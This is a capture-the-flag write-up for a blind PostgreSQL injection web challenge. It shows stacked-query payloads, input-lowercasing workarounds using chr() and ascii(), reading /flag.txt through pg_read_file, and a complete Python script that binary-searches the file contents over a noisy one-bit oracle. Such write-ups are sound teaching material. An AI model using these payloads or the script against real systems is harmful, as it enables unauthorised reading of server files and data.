@@ -1,0 +1,216 @@
+---
+title: 'SunshineCTF 2026 - Planetary Probe'
+description: 'A one-bit Postgres oracle with stacked queries, an input lowercaser that silently folds payload literals, and a pg_read_file grant that pg_has_role denies'
+date: 2026-09-30
+tags: ['writeup', 'web', 'sqli', 'blind-sqli', 'postgresql', 'lfi', 'sunshinectf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+A planet lookup that answers with exactly one bit: *signal detected* or *no signal*. The page says so itself — "The receiver reports one bit: carrier, or none. It will not say what it heard."
+
+The injection is straightforward. The flag is **not in the database at all** — it is `/flag.txt` on the database host, read with `pg_read_file`, which this role can call despite not being a member of `pg_read_server_files`.
+
+Most of my time went on three input-mangling traps and one flaky oracle, and I got the answer hours before I accepted it. That part is at the end, because it is the only genuinely transferable thing here.
+
+## Challenge Description
+
+> The Galactic Federation has opened public access to its Planetary Probe Directory, a database of known planets and their telemetry signatures. Your mission is to interface with the probe console and uncover hidden data the Federation would rather keep secret.
+>
+> The console seems… minimal. No verbose errors, no detailed output — just "signal detected" or "no signal".
+>
+> Can you find a way to communicate with the system, bypass its limited responses, and recover the hidden flag?
+
+## Initial Analysis
+
+One form, one parameter:
+
+```html
+<form class="tuner" action="/probe" method="get">
+  <input id="planet" name="planet" type="text" placeholder="MARS">
+  <button class="key" type="submit">Transmit</button>
+</form>
+```
+
+The response differs in exactly one place — the body class flips between `is-carrier` and `is-null`, and a readout block swaps its text. Nothing else in the body or the headers ever changes. A stacked `SELECT 'QQQQ'` is not reflected anywhere, there is no third state, and the two response sizes are a constant 5622 and 5604 bytes.
+
+The injection point is a plain string context:
+
+```text
+MARS          -> carrier
+ZZZZ          -> null
+MARS'         -> null          (broken quote, error)
+MARS' AND '1'='1   -> carrier
+MARS' AND '1'='2   -> null
+```
+
+Postgres, confirmed by `version()` resolving where `sqlite_version()` and `@@version` do not.
+
+**Stacked queries execute**, which is much nicer than the in-query form. The last statement's row count drives the readout:
+
+```text
+mars'; select 1; --               -> carrier
+mars'; select 1 where false; --   -> null
+```
+
+So the oracle becomes `mars'; select 1 where (<cond>); -- ` and no longer depends on the MARS row existing.
+
+With that, `pg_stat_activity` gives up the application's own SQL:
+
+```sql
+SELECT id FROM planets WHERE name = '<input>'
+```
+
+## Four traps
+
+These are the whole difficulty of the challenge, and each one silently returns *false* rather than erroring.
+
+### 1. The app lowercases the entire input
+
+```text
+'a'='A'        -> true
+'A'='a'        -> true
+'a'=chr(97)    -> true
+'A'=chr(65)    -> false
+```
+
+`'A'` is being folded to `'a'` before the SQL is built. Every uppercase string literal in a payload is destroyed. That means `upper(x)='SELECT'` can never be true, an `IN ('MERCURY','VENUS',...)` list never matches a thing, and — critically — **you cannot compare against the flag with a literal at all**, because the flag contains uppercase characters. Anything case-sensitive has to be built from `chr()`.
+
+This one poisoned several of my early findings. "Not all eight planet names are standard" looked like a real lead; it was just my `IN` list arriving in lowercase.
+
+### 2. A SQL error renders identically to false
+
+There is no error state in the UI, so a malformed query, a permission denial and a genuine `false` are indistinguishable. Every negative result needs a control query beside it that is known to be true, or it means nothing.
+
+### 3. Underscore is a LIKE wildcard
+
+```sql
+-- matches every non-empty row, not "contains an underscore"
+... WHERE t::text LIKE '%' || chr(95) || '%'
+```
+
+`_` matches any single character and `%` matches any run, so a "does it contain an underscore" probe built with `LIKE` is a tautology. Use `strpos()`.
+
+### 4. The oracle has a ~10% false-negative rate
+
+Measured directly, by firing 66 identical always-true probes and counting:
+
+```text
+  size histogram: {5622: 59, 5604: 7}
+```
+
+Seven of 66 true readings came back false. The errors are **one-directional** — a true never appears from a false condition — which is the property that makes everything else work. A single false reading means nothing; retry it, and treat any single true as authoritative.
+
+## The Vulnerability
+
+With a clean oracle, the database turns out to be a dead end. `public` holds exactly two tables, confirmed against `pg_class` rather than just `information_schema`:
+
+- `planets` — `id, name, diameter_km, description`, 8 rows, 362 bytes of row text in total, names stored lowercase, and **no brace anywhere in it** (tested with `chr(123)`, with a `chr(97)` control that passes).
+- `zleak` — one `text` column `v`, which for the first hours of the session was completely empty and later held a single row containing the author's taunt: the literal string `select v from zleak`.
+
+A `sun{` search across roughly 40 system catalogs, each with a positive control proving the row-cast search works, is clean. Databases are exactly `postgres, spacedb, template0, template1`. `dblink` is available but not installed and not trusted, and the role does not own the database, so `CREATE EXTENSION` cannot work either.
+
+The flag is on the filesystem:
+
+```sql
+pg_read_file('/flag.txt')
+```
+
+And it is callable, even though:
+
+```text
+pg_has_role(current_user,'pg_read_server_files','member')   -> false
+pg_monitor / pg_read_all_stats / pg_read_all_settings       -> false
+current_setting('is_superuser')='on'                        -> false
+```
+
+The role is not a member of anything. `EXECUTE` was granted on the function **directly**, which `pg_has_role` has no reason to report.
+
+## Exploitation
+
+Probing paths, retrying every negative four times:
+
+```text
+  /flag                            False
+  /flag.txt                        True
+  /app/flag.txt                    False
+  /root/flag.txt                   False
+```
+
+Then it is an ordinary binary search on the character codes. The file is 36 bytes — 35 printable plus a trailing newline, which is why the initial 32–126 search range leaves position 36 unresolved.
+
+Because the flag contains uppercase, it cannot be verified by comparing against a literal. Instead each position is checked by **ASCII code**, which the lowercaser cannot touch:
+
+```sql
+ascii(substr(pg_read_file('/flag.txt'), 12, 1)) = 115
+```
+
+Every position except 36 confirmed on the first pass. Since flakes only ever produce false negatives, a *confirmed* match cannot be wrong — so that verification is sound even on a 10%-lossy channel.
+
+## The mistake worth keeping
+
+I had this hours earlier and threw it away.
+
+Early on I ran exactly one probe, `length(pg_read_file('/etc/hostname'))>0`, got **false**, and moved on. Then I "confirmed" it with `pg_has_role(current_user,'pg_read_server_files','member')`, which also returned false — and that felt like corroboration, so file read went on the ruled-out list and I spent hours proving the flag was not in a database it was never in.
+
+Both readings were wrong in different ways. The first was a flake, from an oracle I had not yet measured. The second was **correct, and irrelevant** — the role genuinely is not a member of that group; the grant is on the function. The role check was answering a different question than the one I cared about, and I let it stand in for the answer.
+
+Re-running the same capability probe six times returned true on the first attempt:
+
+```text
+  pg_read_file etc     [True, True, True, True, False, True]
+  pg_ls_dir .          [True, True, True, True, True, True]
+```
+
+Test the capability, not a proxy for it. And on a noisy oracle, never let a single negative close a door.
+
+## Solve Script
+
+```python
+import urllib.request, urllib.parse, concurrent.futures as cf
+
+URL = "https://planetary.web.2026.sunshinectf.games/probe"
+F   = "pg_read_file('/flag.txt')"
+
+def one(cond):
+    p = "mars'; select 1 where (" + cond + "); -- "
+    q = URL + "?" + urllib.parse.urlencode({"planet": p})
+    try:
+        return "is-carrier" in urllib.request.urlopen(q, timeout=25).read().decode()
+    except Exception:
+        return False
+
+def ask(cond, n=5):
+    """Errors are one-directional: only false negatives happen, so any true wins."""
+    for _ in range(n):
+        if one(cond):
+            return True
+    return False
+
+def length():
+    lo, hi = 0, 256
+    while lo < hi:
+        m = (lo + hi) // 2
+        if ask(f"length({F})<={m}"): hi = m
+        else: lo = m + 1
+    return lo
+
+def ch(i):
+    lo, hi = 9, 126
+    while lo < hi:
+        m = (lo + hi) // 2
+        if ask(f"ascii(substr({F},{i},1))<={m}"): hi = m
+        else: lo = m + 1
+    return i, chr(lo)
+
+n = length()
+with cf.ThreadPoolExecutor(12) as ex:
+    out = dict(ex.map(ch, range(1, n + 1)))
+print("".join(out[i] for i in sorted(out)))
+```
+
+## Flag
+
+```text
+sun{bl1nd_psqli_2_rc3_p4Nd0FyZt8k2}
+```
